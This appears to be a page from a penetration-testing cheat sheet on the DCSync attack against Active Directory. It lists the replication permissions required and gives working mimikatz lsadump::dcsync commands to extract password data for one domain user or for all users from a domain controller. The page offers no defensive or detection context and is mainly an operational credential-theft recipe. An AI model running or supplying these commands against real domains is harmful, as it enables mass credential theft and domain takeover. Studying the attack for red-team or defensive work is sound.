---
label: From DC
subLabel: (dcsync)
---

# DCSync

> **Requirements**:
>
> * Current user needs `DS-Replication-Get-Changes`, `Replicating Directory Changes All` and `Replicating Directory Changes In Filtered Set` permissions on a domain object granted. By default _Domain Admins_, _Enterprise Admins_, _Administrators_ and _Domain Controllers_ groups have the required permissions.
> * Access to LDAP service on DC.

A DCSync attack exploits a legitimate function of Active Directory to steal password data from Domain Controller database. The DCSync simulates the behavior of a Domain Controller and asks other DC to replicate information using the Directory Replication Service Remote Protocol (MS-DRSR). Most often, the place from which DCSync is executed is not restricted, so you just need to have the right user.

Windows:

> **WARNING**: It assumes that you are the user who has `Replicating Directory Changes` permission and you have valid TGT or TGS for DC LDAP service in memory.

```powershell
.\mimikatz.exe

# Get a single domain user
> lsadump::dcsync /domain:$domain /user:$user

# Get all domain users
> lsadump::dcsync /domain:$domain /all
```
